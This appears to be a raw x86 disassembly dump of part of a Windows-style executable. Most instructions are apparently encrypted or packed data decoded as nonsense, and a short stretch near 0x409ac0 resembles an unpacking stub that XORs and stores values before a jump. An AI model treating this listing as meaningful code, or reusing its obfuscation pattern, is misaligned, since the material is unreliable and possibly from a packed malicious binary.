  40979a:	dec    ebx
  40979b:	inc    ecx
  40979c:	mov    WORD PTR [edi+0x72],?
  40979f:	das    
  4097a0:	add    bh,dh
  4097a2:	dec    edx
  4097a3:	mov    esp,0x73767877
  4097a8:	aaa    
  4097a9:	cmp    DWORD PTR [esi],ebp
  4097ab:	ins    BYTE PTR es:[edi],dx
  4097ac:	add    al,0xd0
  4097ae:	enter  0xf17,0x92
  4097b2:	test   DWORD PTR ds:0xd7c6eec6,0xed15142e
  4097bc:	bswap  ebp
  4097be:	xchg   ebp,eax
  4097bf:	cmc    
  4097c0:	cld    
  4097c1:	push   esp
  4097c2:	lods   eax,DWORD PTR ds:[esi]
  4097c3:	push   ecx
  4097c4:	bound  ecx,QWORD PTR [ecx+esi*1]
  4097c7:	(bad)  
  4097c8:	loope  0x4097e1
  4097ca:	call   0x3a1de43d
  4097cf:	(bad)  
  4097d0:	out    0x10,eax
  4097d2:	xlat   BYTE PTR ds:[ebx]
  4097d3:	mov    BYTE PTR [ecx+0x6090fcc9],ah
  4097d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097da:	nop
  4097db:	daa    
  4097dc:	popf   
  4097dd:	or     esi,edx
  4097df:	rcr    DWORD PTR [esi+0x62],0x7c
  4097e3:	dec    esp
  4097e4:	lea    ebp,[edi]
  4097e6:	add    eax,0x1818f5f4
  4097eb:	lea    edx,[esi+0x2ffeeda7]
  4097f1:	pop    ebx
  4097f2:	jno    0x409808
  4097f4:	xchg   BYTE PTR [eax+ebx*2],bh
  4097f7:	push   DWORD PTR [eax-0x46]
  4097fa:	push   ebx
  4097fb:	xchg   DWORD PTR [ebp+0x195f0a29],eax
  409801:	ss mov ch,0x22
  409804:	sub    ah,BYTE PTR [ecx]
  409806:	sub    ebp,DWORD PTR [ebx+esi*8-0x366ee156]
  40980d:	lahf   
  40980e:	nop
  40980f:	rcr    bh,1
  409811:	cmp    eax,0x272cbc8d
  409816:	mov    DWORD PTR [ebx+0xd],edx
  409819:	pop    edx
  40981a:	shr    DWORD PTR [ecx],cl
  40981c:	xchg   edi,eax
  40981d:	fwait
  40981e:	push   es
  40981f:	adc    BYTE PTR [esi],dl
  409821:	(bad)  
  409824:	add    BYTE PTR [edx-0x71e7a529],bh
  40982a:	call   FWORD PTR [ebx]
  40982c:	push   0x9baee88
  409831:	fidivr WORD PTR [ebx*4+0x1d4c1d0d]
  409838:	dec    esp
  409839:	dec    ebx
  40983a:	and    eax,0xb164340a
  40983f:	les    ecx,FWORD PTR [esi-0x35]
  409842:	cmp    BYTE PTR [edi],bh
  409844:	clc    
  409845:	ins    BYTE PTR es:[edi],dx
  409846:	out    0xb2,al
  409848:	xchg   ebx,eax
  409849:	in     eax,dx
  40984a:	imul   ebp,DWORD PTR [ecx],0x343d286d
  409850:	or     cl,BYTE PTR [esi-0x8]
  409853:	sahf   
  409854:	pop    ds
  409855:	or     DWORD PTR [edx+0x29d62275],ebp
  40985b:	ret    0xa0d2
  40985e:	je     0x4098bb
  409860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409861:	mov    edx,DWORD PTR [ebx+ebx*4-0x60e30040]
  409868:	idiv   DWORD PTR [edi]
  40986a:	std    
  40986b:	into   
  40986c:	mov    ds:0x8b95892c,eax
  409871:	cdq    
  409872:	pop    ecx
  409873:	into   
  409874:	loop   0x40988a
  409876:	sbb    al,0x7a
  409878:	or     ch,BYTE PTR [edx+0xdce2288]
  40987e:	mov    cl,0x9e
  409880:	ror    BYTE PTR [edi],cl
  409882:	xchg   edi,eax
  409883:	sahf   
  409884:	rol    dl,1
  409886:	or     al,dh
  409888:	xchg   DWORD PTR [ebp+0x19824287],ecx
  40988e:	push   es
  40988f:	jl     0x4098c0
  409891:	leave  
  409892:	dec    ebp
  409893:	loopne 0x40981e
  409895:	cmovne eax,DWORD PTR [ebp+0x1cee0e49]
  40989c:	pop    edi
  40989d:	test   eax,0xe0da51b5
  4098a2:	pop    ax
  4098a4:	jmp    0x7d8d8d84
  4098a9:	daa    
  4098aa:	adc    BYTE PTR [edi-0x2d99407c],bl
  4098b0:	(bad)
  4098b3:	lods   eax,DWORD PTR ds:[esi]
  4098b4:	jl     0x409899
  4098b6:	aam    0x47
  4098b8:	orps   xmm6,XMMWORD PTR [ebp-0x4285f166]
  4098bf:	(bad)
  4098c2:	sahf   
  4098c3:	inc    ebx
  4098c4:	test   esi,0x565faf4a
  4098ca:	inc    edi
  4098cb:	and    eax,0x4e556970
  4098d0:	aam    0xc7
  4098d2:	mov    ?,WORD PTR [edx-0x734e33ae]
  4098d8:	outs   dx,DWORD PTR ds:[esi]
  4098d9:	cs xchg ecx,eax
  4098db:	test   DWORD PTR [ebx-0xe],edx
  4098de:	cld    
  4098df:	mov    bh,0x62
  4098e1:	aad    0x3f
  4098e3:	jle    0x409908
  4098e5:	push   edi
  4098e6:	xchg   esi,eax
  4098e7:	neg    edi
  4098e9:	mov    ch,0xa4
  4098eb:	clc    
  4098ec:	(bad)  
  4098ed:	loopne 0x4098ad
  4098ef:	ja     0x409910
  4098f1:	dec    esi
  4098f2:	test   BYTE PTR [edx+0x6d85dcaa],cl
  4098f8:	or     al,0xe9
  4098fa:	fldenv [esi]
  4098fc:	pop    ss
  4098fd:	out    0xfa,al
  4098ff:	xor    eax,0x1557c777
  409904:	jle    0x40989c
  409906:	(bad)  
  409908:	or     BYTE PTR [esi-0x4e4cabb3],cl
  40990e:	and    DWORD PTR [edi-0xe],eax
  409911:	leave  
  409912:	inc    ebp
  409913:	lods   al,BYTE PTR ds:[esi]
  409914:	in     eax,0x5a
  409916:	clc    
  409917:	mov    edi,0x4cf1fd56
  40991c:	xchg   ecx,eax
  40991d:	dec    eax
  40991e:	push   edx
  40991f:	fs mov bh,0xfc
  409922:	call   0xc509:0x1251db5a
  409929:	outs   dx,BYTE PTR ds:[esi]
  40992a:	jne    0x4098fa
  40992c:	rcr    BYTE PTR [ecx+0x5a],1
  40992f:	or     dl,bh
  409931:	or     al,0x20
  409933:	popf   
  409934:	sbb    BYTE PTR [ebx-0xf],bl
  409937:	dec    esi
  409938:	sub    al,0x99
  40993a:	mov    ?,WORD PTR [ebp+0x55a58355]
  409940:	mov    ebp,0x19b85aba
  409945:	sbb    ecx,edi
  409947:	rcl    bl,0x9d
  40994a:	or     DWORD PTR [ebx-0x5a],edx
  40994d:	sbb    eax,0x3238faed
  409952:	mov    ecx,0x2ca9a10c
  409957:	cwde   
  409958:	fidivr WORD PTR ds:0xf262c063
  40995e:	scas   al,BYTE PTR es:[edi]
  40995f:	push   ebx
  409960:	cmp    eax,0x811cf84e
  409965:	mov    edi,0x5c83b916
  40996a:	push   0xffffffc5
  40996c:	imul   ecx,DWORD PTR [ebx+0x6f],0xfffffff1
  409970:	mov    WORD PTR [edi],es
  409972:	in     eax,dx
  409973:	push   ss
  409974:	out    0x55,al
  409976:	aad    0x2d
  409978:	sti    
  409979:	or     DWORD PTR [ecx-0xa],0x6a488726
  409980:	jg     0x4099d6
  409982:	push   es
  409983:	jg     0x40999f
  409985:	outs   dx,BYTE PTR ds:[esi]
  409986:	xor    dh,BYTE PTR [esi-0x2ee05649]
  40998c:	inc    eax
  40998d:	aas    
  40998e:	sub    ebx,esi
  409990:	push   esi
  409991:	sbb    al,0xb5
  409993:	sbb    BYTE PTR [ebx],al
  409995:	mov    ecx,ebx
  409997:	sbb    al,0x7f
  409999:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40999b:	into   
  40999c:	scas   al,BYTE PTR es:[edi]
  40999d:	data16 test BYTE PTR [esi+0x55337b5c],dh
  4099a4:	pop    ss
  4099a5:	call   FWORD PTR [edi-0x2d]
  4099a8:	ret    0xa6c6
  4099ab:	imul   eax,DWORD PTR [eax+0x4cf31100],0xda1badaa
  4099b5:	sbb    al,0x89
  4099b7:	sbb    ebp,DWORD PTR [edx+0x6eaf349]
  4099bd:	rcl    BYTE PTR [ebp+0x7b],0xce
  4099c1:	push   0x7ab01fb0
  4099c6:	pop    eax
  4099c7:	or     edi,DWORD PTR [eax-0x34c45d38]
  4099cd:	pop    ebp
  4099ce:	mov    ebx,0xf64d94e1
  4099d3:	inc    ebx
  4099d4:	test   al,0xb9
  4099d6:	pop    ebx
  4099d7:	xchg   edx,eax
  4099d8:	mov    BYTE PTR [ebx+0xe3eda47],ah
  4099de:	fdiv   DWORD PTR [ecx+0x5c]
  4099e1:	popa   
  4099e2:	fdivr  QWORD PTR [eax+0x5b593d50]
  4099e8:	(bad)  
  4099e9:	out    0xae,eax
  4099eb:	push   esp
  4099ec:	mov    ecx,0x40e8863e
  4099f1:	aaa    
  4099f2:	outs   dx,BYTE PTR ds:[esi]
  4099f3:	mov    bh,0x81
  4099f5:	inc    edi
  4099f6:	js     0x4099b2
  4099f8:	xor    ebx,edi
  4099fa:	xchg   esp,eax
  4099fc:	fidivr WORD PTR [eax-0x66]
  4099ff:	(bad)  
  409a00:	sti    
  409a01:	push   ss
  409a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a03:	(bad)  
  409a04:	mov    al,0xad
  409a06:	call   0xd43a:0x2b4ee8b6
  409a0d:	fild   DWORD PTR [eax+eax*1-0x33]
  409a11:	lods   al,BYTE PTR ds:[esi]
  409a12:	enterw 0xa24c,0x9d
  409a17:	fmul   DWORD PTR [ecx]
  409a19:	test   al,0xf7
  409a1b:	push   eax
  409a1c:	xor    DWORD PTR [ebx+0x6c],ecx
  409a1f:	in     al,0x30
  409a21:	jb     0x4099db
  409a23:	sbb    DWORD PTR [esp+eax*8],0xc4069de9
  409a2a:	leave  
  409a2b:	test   eax,0xabbf62ee
  409a30:	ficom  WORD PTR [ecx]
  409a32:	fldcw  WORD PTR [edi+ebx*8]
  409a35:	in     al,0xa0
  409a37:	and    al,0x1f
  409a39:	lods   eax,DWORD PTR ds:[esi]
  409a3a:	iret   
  409a3b:	add    ch,BYTE PTR [ecx-0x440a64c8]
  409a41:	and    ah,dl
  409a43:	in     eax,dx
  409a44:	mov    al,ds:0x4c21e1a9
  409a49:	gs jmp 0x284bd0bd
  409a4f:	push   ecx
  409a50:	sub    ah,BYTE PTR [edx-0x11904d86]
  409a56:	push   0x88b074ee
  409a5b:	inc    ecx
  409a5c:	and    BYTE PTR [ecx],0x38
  409a5f:	jno    0x409aba
  409a61:	stc    
  409a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a63:	or     al,0xd4
  409a65:	jp     0x409a1a
  409a67:	dec    edx
  409a68:	(bad)  
  409a69:	retf   0xea27
  409a6c:	adc    BYTE PTR [ebx],0x30
  409a6f:	pop    edi
  409a70:	fiadd  WORD PTR [eax+0x7f]
  409a73:	sti    
  409a74:	jp     0x409a70
  409a76:	add    al,0xf9
  409a78:	nop
  409a79:	inc    ebx
  409a7a:	cmp    al,0x6e
  409a7c:	stos   BYTE PTR es:[edi],al
  409a7d:	out    dx,al
  409a7e:	cwde   
  409a7f:	out    0xbb,al
  409a81:	push   ebx
  409a82:	and    dh,bh
  409a84:	mov    eax,ds:0x546a1b20
  409a89:	adc    eax,0x1933b6ca
  409a8e:	(bad)  
  409a8f:	pop    ebx
  409a90:	pusha  
  409a91:	icebp  
  409a92:	sbb    dh,BYTE PTR [ebp+0x7c]
  409a95:	out    0x0,eax
  409a97:	pop    es
  409a98:	mov    eax,0xe07ffb61
  409a9d:	lods   eax,DWORD PTR ds:[esi]
  409a9e:	sbb    bh,BYTE PTR [ebx+0x19]
  409aa1:	rcr    DWORD PTR [eax-0x24c092cd],cl
  409aa7:	cmp    esp,DWORD PTR [eax+0x6cd07562]
  409aad:	in     eax,dx
  409aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aaf:	jl     0x409a91
  409ab1:	(bad)  
  409ab2:	std    
  409ab3:	jnp    0x409a63
  409ab5:	cmp    ebx,DWORD PTR [ecx+0xd8b56c0]
  409abb:	or     BYTE PTR [eax],ah
  409abd:	inc    edx
  409abe:	add    BYTE PTR [ebx],al
  409ac0:	or     eax,0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409ae6
  409b48:	or     eax,0x4399958
  409b4d:	jp     0x409bc9
  409b4f:	sbb    DWORD PTR [edi+0x7a],ebx
  409b52:	jp     0x409b07
  409b54:	push   ebx
  409b55:	sub    DWORD PTR [eax+0x73],eax
  409b58:	iret   
  409b59:	repnz inc BYTE PTR [ebx-0x66678f0]
  409b60:	daa    
  409b61:	cmp    al,0xfe
  409b63:	scas   al,BYTE PTR es:[edi]
  409b64:	push   cs
  409b65:	adc    al,0x77
  409b67:	jg     0x409b85
  409b69:	test   al,0xc4
  409b6b:	(bad)  
  409b6c:	xor    esi,DWORD PTR [eax]
  409b6e:	pop    edi
  409b6f:	loope  0x409bd0
  409b71:	and    BYTE PTR [ebp-0x4c980965],cl
  409b77:	int3   
  409b78:	inc    esp
  409b79:	sub    BYTE PTR [eax+ecx*2-0x556208b5],0x2b
  409b81:	addr16 jmp 0x6dfbee4
  409b87:	xchg   ecx,eax
  409b88:	push   eax
  409b89:	push   ds
  409b8a:	or     bl,ah
  409b8c:	retf   0xedff
  409b8f:	mov    BYTE PTR [eiz*2-0x2601c96],0xfb
  409b97:	lds    esi,FWORD PTR ds:0x10c6b3b1
  409b9d:	add    dh,BYTE PTR [ebx]
  409b9f:	xchg   ecx,eax
  409ba0:	inc    eax
  409ba1:	lods   al,BYTE PTR ds:[esi]
  409ba2:	adc    DWORD PTR [esi+0x1b3d67e8],edx
  409ba8:	mov    edx,DWORD PTR [ecx]
  409baa:	add    BYTE PTR [edi-0x6d],cl
  409bad:	test   DWORD PTR [eax],edi
  409baf:	cmp    edx,0x5176ff91
  409bb5:	xor    DWORD PTR [ecx+0x575fa378],eax
  409bbb:	nop
  409bbc:	jecxz  0x409c28
  409bbe:	mov    al,0x71
  409bc0:	enter  0x7a61,0xc8
  409bc4:	pop    edx
  409bc5:	xchg   esp,eax
  409bc6:	inc    edx
  409bc7:	push   ss
  409bc8:	pop    edi
  409bc9:	cld    
  409bca:	std    
  409bcb:	outs   dx,DWORD PTR ds:[esi]
  409bcc:	cmp    esp,DWORD PTR [ebp+0x55]
  409bcf:	scas   al,BYTE PTR es:[edi]
  409bd0:	sbb    DWORD PTR [esi-0x28a06aa1],edi
  409bd6:	mov    eax,ds:0xa583970c
  409bdb:	and    ah,dl
  409bdd:	lds    esi,FWORD PTR [esi+0x3a]
  409be0:	aaa    
  409be1:	dec    ebp
  409be2:	adc    eax,0xb672ad0
  409be7:	dec    esp
  409be8:	sub    eax,0xa62007f
  409bed:	mov    esp,0x872700ef
  409bf2:	xlat   BYTE PTR ds:[ebx]
  409bf3:	fidivr DWORD PTR [ebp-0x77d8fef4]
  409bf9:	pop    ds
  409bfa:	sub    al,0xdd
  409bfc:	mov    edi,0x4c2023f8
  409c01:	ja     0x409c0e
  409c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c04:	fwait
  409c05:	cld    
  409c06:	sbb    BYTE PTR [edx],dh
  409c08:	in     al,dx
  409c09:	pop    ebx
  409c0a:	push   0xffffff90
  409c0c:	data16 mov bh,0xf9
  409c0f:	shl    DWORD PTR [bp+di],1
  409c12:	jnp    0x409be2
  409c14:	mov    ah,0x60
  409c16:	iret   
  409c17:	lds    eax,FWORD PTR [ecx+0x35]
  409c1a:	add    BYTE PTR [eax+0x330265ac],dh
  409c20:	pushf  
  409c21:	mov    BYTE PTR [eax-0x74],bl
  409c24:	in     eax,0xcd
  409c26:	sub    al,0x10
  409c28:	xchg   esp,eax
  409c2a:	adc    ecx,ecx
  409c2c:	fiadd  WORD PTR [ebx+0x1b6875b8]
  409c32:	add    eax,0xcc6db714
  409c37:	pusha  
  409c38:	sbb    ah,BYTE PTR ds:0xd9982a80
  409c3e:	push   edx
  409c3f:	mov    ss,esp
  409c41:	(bad)  
  409c42:	or     DWORD PTR [esi-0x21c650c5],ecx
  409c48:	pop    ecx
  409c49:	pop    es
  409c4a:	or     BYTE PTR [edi+0x57f919d8],dh
  409c50:	pop    ebx
  409c51:	stos   BYTE PTR es:[edi],al
  409c52:	out    0xa6,al
  409c54:	(bad)  
  409c56:	out    dx,al
  409c57:	test   BYTE PTR [ecx+0x664db758],ch
  409c5d:	ins    DWORD PTR es:[edi],dx
  409c5e:	inc    edx
  409c5f:	mov    cl,0x1a
  409c61:	aad    0xd0
  409c63:	jmp    0x13fc:0x25572112
  409c6a:	or     al,0x29
  409c6c:	cmp    ecx,DWORD PTR [ebx]
  409c6e:	aam    0xff
  409c70:	in     al,0x43
  409c72:	imul   edi,DWORD PTR [esi+0x50d3dc15],0xb
  409c79:	retf   0x88dd
  409c7c:	jne    0x409c73
  409c7e:	imul   eax,DWORD PTR [esi+0x2e],0x70f35625
  409c85:	add    dh,BYTE PTR [eax-0x22]
  409c88:	ss inc edx
  409c8a:	pop    ss
  409c8b:	xchg   esi,eax
  409c8c:	inc    edi
  409c8d:	fwait
  409c8e:	pop    esi
  409c8f:	jle    0x409cd0
  409c91:	xchg   al,dl
  409c93:	sbb    al,0xe2
  409c95:	jmp    0x409ca6
  409c97:	xor    DWORD PTR [edi],eax
  409c99:	inc    ecx
  409c9a:	lahf   
  409c9b:	imul   eax,DWORD PTR [ecx],0xd4821ec
  409ca1:	mov    ch,0xee
  409ca3:	ins    DWORD PTR es:[edi],dx
  409ca4:	cmp    al,0x5a
  409ca6:	call   0xa010c097
  409cab:	fist   WORD PTR [edi+0x4f]
  409cae:	ret    0x4fa0
  409cb1:	sbb    al,0x4b
  409cb3:	cli    
  409cb4:	sbb    bl,BYTE PTR [ebp+0x2a]
  409cb7:	stc    
  409cb8:	push   cs
  409cb9:	aam    0xb7
  409cbb:	push   cs
  409cbc:	les    edi,FWORD PTR [edx-0x55]
  409cbf:	mov    cl,0x8d
  409cc1:	or     ebx,edi
  409cc3:	int    0x57
  409cc5:	pop    esp
  409cc6:	push   ebx
  409cc7:	sbb    edi,DWORD PTR [esi]
  409cc9:	in     al,dx
  409cca:	cmp    eax,0x8bb5ed5e
  409ccf:	popa   
  409cd0:	fs pop ss
  409cd2:	sub    eax,0x789fd4e6
  409cd7:	fnsave [edi]
  409cd9:	in     al,dx
  409cda:	dec    ecx
  409cdb:	or     BYTE PTR [edi+0x35],dh
  409cde:	ja     0x409c7a
  409ce0:	inc    ebp
  409ce1:	ja     0x409d25
  409ce3:	cs jge 0x409cbd
  409ce6:	pop    ds
  409ce7:	aad    0x6a
  409ce9:	hlt    
  409cea:	sbb    al,0x8b
  409cec:	lahf   
  409ced:	in     eax,dx
  409cee:	and    DWORD PTR [ecx-0x3d9c63fb],esp
  409cf4:	dec    esp
  409cf5:	jge    0x409cea
  409cf7:	aam    0x15
  409cf9:	das    
  409cfa:	fcomp  QWORD PTR [ecx-0x6ec26656]
  409d00:	test   eax,0x7666fb51
  409d05:	loopne 0x409d7c
  409d07:	jl     0x409c8b
  409d09:	rcr    DWORD PTR [esi+0x2f896945],cl
  409d0f:	scas   al,BYTE PTR es:[edi]
  409d10:	or     esp,esp
  409d12:	cli    
  409d13:	jno    0x409ce1
  409d15:	ret    0x232a
  409d18:	jbe    0x409cbd
  409d1a:	shl    DWORD PTR [ebp-0x7f],1
  409d1d:	out    0xc4,al
  409d1f:	inc    ebp
  409d20:	push   0xffffffa3
  409d22:	sbb    DWORD PTR [edx-0x720b441f],0xdb1b49d5
  409d2c:	or     al,BYTE PTR [esi]
  409d2e:	adc    ch,BYTE PTR [edx+edx*1]
  409d31:	cmp    al,0xd5
  409d33:	push   edi
  409d34:	push   es
  409d35:	dec    ecx
  409d36:	(bad)  
  409d37:	bound  esp,QWORD PTR [esi]
  409d39:	retf   
  409d3a:	xchg   BYTE PTR [ebp-0x48],dh
  409d3d:	inc    esi
  409d3e:	fwait
  409d3f:	das    
  409d40:	nop
  409d41:	cmp    al,0x19
  409d43:	ja     0x409d06
  409d45:	push   0xf64ca609
  409d4a:	push   ds
  409d4b:	sbb    cl,BYTE PTR [ecx-0x5d]
  409d4e:	xchg   ecx,eax
  409d4f:	sub    al,0xb6
  409d51:	push   edx
  409d52:	mov    edi,edi
  409d54:	push   ss
  409d55:	add    ah,BYTE PTR [edx-0x2753abf7]
  409d5b:	pop    ecx
  409d5c:	mov    ch,0x3b
  409d5e:	xor    DWORD PTR [edi-0x402142bd],edx
  409d64:	stos   DWORD PTR es:[edi],eax
  409d65:	imul   ebx,DWORD PTR [ebp-0x13],0x4f6cdf9d
  409d6c:	mov    eax,ds:0xde17fcc4
  409d71:	mov    ebx,0xd6f72239
  409d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d77:	ins    DWORD PTR es:[edi],dx
  409d78:	daa    
  409d79:	push   0x61
  409d7b:	mov    ds:0x45029076,eax
  409d80:	mov    DWORD PTR [eax],esi
  409d82:	(bad)  
  409d83:	into   
  409d84:	push   0xffffff8a
  409d86:	xor    BYTE PTR [edi*2-0x3c39cdad],0xd2
  409d8e:	repz shl BYTE PTR [edi],1
  409d91:	inc    ecx
  409d92:	inc    edi
  409d93:	jno    0x409da0
  409d95:	mov    esi,0x8395017b
  409d9a:	ins    DWORD PTR es:[edi],dx
  409d9b:	mov    WORD PTR ss:[edx+eax*2+0x5e85259c],ss
  409da3:	inc    eax
  409da4:	and    bl,BYTE PTR [ecx+0x3b]
  409da7:	cmc    
  409da8:	or     ebx,ebp
  409daa:	mov    ?,WORD PTR [edi+0x4f]
  409dad:	mov    cl,0x8e
  409daf:	enter  0x7060,0x7d
  409db3:	into   
  409db4:	aad    0xb6
  409db6:	add    eax,0xf4d65bdf
  409dbb:	fistp  QWORD PTR [ebp+0x43564b10]
  409dc1:	xor    BYTE PTR [ebp-0x52291463],cl
  409dc7:	jbe    0x409d63
  409dc9:	nop
  409dca:	mov    ah,0x26
  409dcc:	js     0x409d5e
  409dce:	fstp   st(6)
  409dd1:	icebp  
  409dd2:	and    ebx,DWORD PTR [esi-0x2649a070]
  409dd8:	mov    edi,ebp
  409dda:	push   cs
  409ddb:	add    DWORD PTR [edi],ecx
  409ddd:	ficomp WORD PTR [edi+eax*4]
  409de0:	push   ebp
  409de1:	adc    eax,0x6758a497
  409de6:	pop    ecx
  409de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de8:	jbe    0x409e5c
  409dea:	shl    ecx,0x83
  409ded:	and    DWORD PTR [ecx-0x6b],edx
  409df0:	cmp    dl,BYTE PTR [ebx+0x5a2afa8]
  409df6:	push   ecx
  409df7:	add    eax,0x76ebfcae
  409dfc:	cmp    BYTE PTR [ecx+0x745faba3],al
  409e02:	iret   
  409e03:	and    ch,BYTE PTR [ecx-0x5b195c5]
  409e09:	dec    edi
  409e0a:	es pop edx
  409e0c:	fisubr DWORD PTR [edx]
  409e0e:	mov    bh,0xd8
  409e10:	xchg   DWORD PTR [eax+0x3c],esp
  409e13:	test   BYTE PTR [ebp-0x4f],dh
  409e16:	lods   eax,DWORD PTR ds:[esi]
  409e17:	jge    0x409e65
  409e19:	xchg   dh,bh
  409e1b:	daa    
  409e1c:	out    dx,al
  409e1d:	(bad)  
  409e1e:	pop    ss
  409e1f:	bound  edx,QWORD PTR [esi-0x10f840b3]
  409e25:	mov    WORD PTR [ebx+0x637f14ab],es
  409e2b:	sub    al,0x8c
  409e2d:	mov    al,ss:0x5a7ee0b7
  409e33:	inc    DWORD PTR [edi-0x4e]
  409e36:	jmp    0x409e6c
  409e38:	mov    eax,0xe9e147a4
  409e3d:	mov    edx,0xce1bfcd5
  409e42:	mov    ecx,0x46393cfd
  409e47:	ja     0x409e96
  409e49:	fstp   QWORD PTR [ecx-0x2d8e8dc3]
  409e4f:	and    dl,BYTE PTR [ecx+0x46]
  409e52:	in     al,0x6a
  409e54:	jmp    0x409e81
  409e56:	mov    esi,0x128440fe
  409e5b:	aam    0x62
  409e5d:	repnz mov ah,0x37
  409e60:	xchg   esi,eax
  409e61:	mov    cl,0xf2
  409e63:	sub    al,0x58
  409e65:	cmp    BYTE PTR [ebx+0x3d0a8cba],ah
  409e6b:	sub    edx,DWORD PTR [eax]
  409e6d:	js     0x409e21
  409e6f:	pop    ebp
  409e70:	mov    bh,0x28
  409e72:	lea    esp,[eax+0x78]
  409e75:	stc    
  409e76:	xor    eax,0xc78829d
  409e7b:	xchg   ecx,eax
  409e7c:	mov    edx,0x798e761a
  409e81:	or     BYTE PTR [eax+0x3d],bh
  409e84:	aaa    
  409e85:	dec    BYTE PTR [ecx]
  409e87:	bnd jp 0x409e57
  409e8a:	mov    ds:0xd5d38839,eax
  409e8f:	inc    edi
  409e90:	mov    dh,0xb8
  409e92:	ret    0x2d5e
  409e95:	in     al,0xae
  409e97:	inc    esp
  409e98:	mov    dh,BYTE PTR [edi]
  409e9a:	mov    DWORD PTR [ecx+0x46],edx
  409e9d:	repnz pop ecx
  409e9f:	jns    0x409e72
  409ea1:	push   ss
  409ea2:	dec    edi
  409ea3:	stc    
  409ea4:	(bad)  
  409ea5:	ins    BYTE PTR es:[edi],dx
  409ea6:	loopne 0x409f05
  409ea8:	das    
  409ea9:	sub    eax,0x7c55e07c
  409eae:	in     eax,0x67
  409eb0:	orps   xmm7,XMMWORD PTR [ecx-0x6d]
  409eb4:	shl    DWORD PTR [ecx],0x2b
  409eb7:	inc    esp
  409eb8:	add    al,0x29
  409eba:	(bad)  
  409ebb:	movaps XMMWORD PTR [ebx],xmm1
  409ebe:	out    0xe5,eax
  409ec0:	cmp    BYTE PTR [edx-0x18ac6d1],0x3c
  409ec7:	shl    BYTE PTR [ebx+0x628fdf81],cl
  409ecd:	mov    al,0x1e
  409ecf:	adc    DWORD PTR [ebx],edx
  409ed1:	repz inc ebx
  409ed3:	fiadd  WORD PTR [edi+0x7f]
  409ed6:	adc    BYTE PTR [esi],ch
  409ed8:	push   ss
  409ed9:	sub    eax,ecx
  409edb:	inc    ebp
  409edc:	mov    dl,BYTE PTR [bp+si+0x2c]
  409ee0:	inc    edx
  409ee2:	ds das 
  409ee4:	in     al,dx
  409ee5:	stos   BYTE PTR es:[edi],al
  409ee6:	sbb    cl,0xac
  409ee9:	mov    eax,ds:0xd4ec7816
  409eee:	push   edx
  409eef:	jae    0x409f00
  409ef1:	popf   
  409ef2:	int3   
  409ef3:	inc    ebx
  409ef4:	retf   0x1de8
  409ef7:	xchg   ebx,eax
  409ef8:	loopne 0x409e8f
  409efa:	fsubr  DWORD PTR [edx]
  409efc:	pop    edi
  409efd:	pop    ecx
  409efe:	mov    WORD PTR [esp+edx*1],?
  409f01:	cld    
  409f02:	inc    ebp
  409f03:	inc    ebx
  409f04:	mov    esp,0xca57094d
  409f09:	or     ecx,DWORD PTR [edi]
  409f0b:	iret   
  409f0c:	add    eax,0xef845595
  409f11:	outs   dx,BYTE PTR ds:[esi]
  409f12:	mov    cl,0xf2
  409f14:	push   edx
  409f15:	sbb    BYTE PTR [ecx],bh
  409f17:	das    
  409f18:	mov    dh,0xf9
  409f1a:	leave  
  409f1b:	shufps xmm7,XMMWORD PTR [edx],0x9f
  409f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f20:	sub    ah,BYTE PTR [ebx]
  409f22:	pop    es
  409f23:	jns    0x409f5d
  409f25:	push   ds
  409f26:	fmul   QWORD PTR [edx]
  409f28:	call   0x7fbb:0xde13c842
  409f2f:	jo     0x409f04
  409f31:	mov    esi,0x3c023ca
  409f36:	mov    dh,0xbb
  409f38:	adc    al,0xcf
  409f3a:	stos   BYTE PTR es:[edi],al
  409f3b:	and    ah,BYTE PTR [ecx]
  409f3d:	out    0x1b,eax
  409f3f:	sbb    DWORD PTR es:[eax],ecx
  409f42:	inc    esi
  409f43:	push   esi
  409f44:	push   0x7e
  409f46:	mov    ebx,0x48ee6c81
  409f4b:	pop    esp
  409f4c:	cli    
  409f4d:	jb     0x409f3b
  409f4f:	nop
  409f50:	mov    WORD PTR [ecx+0x29c9d315],?
  409f56:	ds loop 0x409fab
  409f59:	mov    cl,0xc8
  409f5b:	push   es
  409f5c:	mov    eax,DWORD PTR [esi-0x3e91b222]
  409f62:	mov    edi,?
  409f64:	jmp    0x409fb0
  409f66:	arpl   si,cx
  409f68:	push   es
